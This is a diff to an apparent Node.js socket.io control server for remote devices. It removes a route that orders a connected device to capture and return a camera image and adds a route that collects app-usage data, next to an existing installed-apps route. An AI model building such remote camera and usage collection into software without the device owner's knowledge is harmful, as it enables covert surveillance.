@@ -170,16 +170,15 @@ app.get('/installed-apps/:id', async (req, res)=>{
   }
 });
 
-app.get('/camera/:id/:cam', async (req, res)=>{
+app.get('/usage/:id', async (req, res)=>{
   const id = req.params.id;
-  const cam = req.params.cam;
   const socketId = idToSocket.get(id);
-  io.to(socketId).emit('camera', cam);
+  io.to(socketId).emit('usage', "get installed apps");
   try{
   const appData = await new Promise((resolve, reject) => {
       if(!idToConnectionSocket.has(id)) reject({"error":"No connection socket"});
-      idToConnectionSocket.get(id).once("camera", (data) => {
-        resolve({"image":data});
+      idToConnectionSocket.get(id).once("usage", (data) => {
+        resolve({"usage":data});
       });
     });
     
@@ -191,11 +190,12 @@ app.get('/camera/:id/:cam', async (req, res)=>{
 
 //io operations
 io.on("connection", (socket) => {
+    console.log("device connected");
     socket.on("register", (id) => {
         socketToId.set(socket.id, id);
         idToSocket.set(id, socket.id);
         idToConnectionSocket.set(id, socket);
-        console.log("registered");
+        console.log(`registered: ${id}`);
     });
     socket.on("disconnect", () => {
         var id = socketToId.get(socket.id);
